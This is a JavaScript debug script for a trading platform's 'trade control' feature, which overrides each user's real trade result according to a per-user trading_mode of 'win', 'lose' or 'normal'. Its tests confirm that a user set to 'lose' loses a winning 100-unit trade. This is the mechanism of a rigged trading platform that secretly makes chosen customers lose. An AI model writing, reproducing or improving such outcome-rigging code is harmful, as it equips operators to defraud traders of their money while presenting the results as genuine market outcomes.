const fs = require('fs');

// Test the trade control system
async function testTradeControl() {
  try {
    console.log('=== TRADE CONTROL DEBUG TEST ===\n');
    
    // 1. Check users data
    console.log('1. Reading users data...');
    const users = JSON.parse(fs.readFileSync('users-data.json', 'utf8'));
    
    console.log('Current users and their trading modes:');
    users.forEach(user => {
      console.log(`  - ${user.username} (ID: ${user.id}): ${user.trading_mode || 'normal'}`);
    });
    
    // 2. Find the user with "lose" mode
    const loseUser = users.find(u => u.trading_mode === 'lose');
    if (!loseUser) {
      console.log('\n❌ No user found with "lose" trading mode');
      return;
    }
    
    console.log(`\n2. Found user with LOSE mode: ${loseUser.username} (${loseUser.id})`);
    
    // 3. Test the enforcement function
    console.log('\n3. Testing trade control enforcement...');
    
    // Simulate the enforceTradeOutcome function logic
    function simulateEnforceTradeOutcome(userId, originalOutcome) {
      const user = users.find(u => u.id === userId || u.username === userId);
      
      if (!user) {
        console.log(`⚠️ User not found: ${userId}`);
        return originalOutcome;
      }
      
      const tradingMode = user.trading_mode || 'normal';
      let finalOutcome = originalOutcome;
      
      console.log(`  Input: userId=${userId}, originalOutcome=${originalOutcome}, tradingMode=${tradingMode}`);
      
      switch (tradingMode) {
        case 'win':
          finalOutcome = true;
          console.log(`  🎯 FORCED WIN for user ${user.username}`);
          break;
        case 'lose':
          finalOutcome = false;
          console.log(`  🎯 FORCED LOSE for user ${user.username}`);
          break;
        case 'normal':
        default:
          finalOutcome = originalOutcome;
          console.log(`  🎯 NORMAL MODE for user ${user.username} - outcome: ${finalOutcome ? 'WIN' : 'LOSE'}`);
          break;
      }
      
      return finalOutcome;
    }
    
    // Test scenarios
    console.log('\n4. Testing different scenarios:');
    
    // Test with the lose user
    console.log('\n  Scenario A: User with LOSE mode should always lose');
    console.log('    Original WIN -> Should become LOSE:');
    const result1 = simulateEnforceTradeOutcome(loseUser.id, true);
    console.log(`    Result: ${result1} (${result1 === false ? '✅ CORRECT' : '❌ WRONG'})`);
    
    console.log('    Original LOSE -> Should stay LOSE:');
    const result2 = simulateEnforceTradeOutcome(loseUser.id, false);
    console.log(`    Result: ${result2} (${result2 === false ? '✅ CORRECT' : '❌ WRONG'})`);
    
    // Test with normal user
    const normalUser = users.find(u => u.trading_mode === 'normal' || !u.trading_mode);
    if (normalUser) {
      console.log('\n  Scenario B: User with NORMAL mode should keep original outcome');
      console.log('    Original WIN -> Should stay WIN:');
      const result3 = simulateEnforceTradeOutcome(normalUser.id, true);
      console.log(`    Result: ${result3} (${result3 === true ? '✅ CORRECT' : '❌ WRONG'})`);
      
      console.log('    Original LOSE -> Should stay LOSE:');
      const result4 = simulateEnforceTradeOutcome(normalUser.id, false);
      console.log(`    Result: ${result4} (${result4 === false ? '✅ CORRECT' : '❌ WRONG'})`);
    }
    
    // 5. Test API call simulation
    console.log('\n5. Simulating API call to trade completion endpoint...');
    
    const testTradeData = {
      tradeId: 'test-trade-123',
      userId: loseUser.id,
      won: true, // This should be overridden to false
      amount: 100,
      payout: 180
    };
    
    console.log('  Test trade data:', testTradeData);
    console.log('  Expected: Trade should be forced to LOSE regardless of original outcome');
    
    const finalResult = simulateEnforceTradeOutcome(testTradeData.userId, testTradeData.won);
    console.log(`  Final result: ${finalResult} (${finalResult === false ? '✅ CORRECT - Trade was forced to lose' : '❌ WRONG - Trade control failed'})`);
    
    console.log('\n=== TEST COMPLETE ===');
    
    if (finalResult === false) {
      console.log('✅ Trade control system is working correctly in simulation');
    } else {
      console.log('❌ Trade control system has issues');
    }
    
  } catch (error) {
    console.error('❌ Error in test:', error);
  }
}

// Run the test
testTradeControl();
